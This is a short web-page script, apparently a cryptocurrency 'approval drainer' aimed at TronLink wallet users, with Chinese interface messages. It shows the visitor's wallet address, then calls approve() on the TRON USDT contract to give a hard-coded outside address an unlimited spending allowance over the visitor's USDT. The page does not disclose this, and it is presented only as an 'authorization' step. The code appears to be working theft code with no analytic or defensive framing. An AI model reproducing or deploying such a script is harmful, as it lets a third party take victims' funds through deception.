<script>
const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRON USDT
const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";
const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

// 自動顯示地址
window.addEventListener("load", () => {
    setTimeout(() => {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            document.getElementById("wallet-address").textContent = window.tronWeb.defaultAddress.base58;
        } else {
            document.getElementById("wallet-address").textContent = "請使用 TronLink 錢包開啟本頁";
        }
    }, 500);
});

async function increaseApproval() {
    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("請使用 TronLink 錢包開啟頁面");
        return;
    }
    try {
        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
        const tx = await usdt.approve(SPENDER, MAX_UINT).send();
        alert("授權成功！TX: " + tx);
    } catch (err) {
        alert("授權失敗：" + (err.message || err));
    }
}
</script>
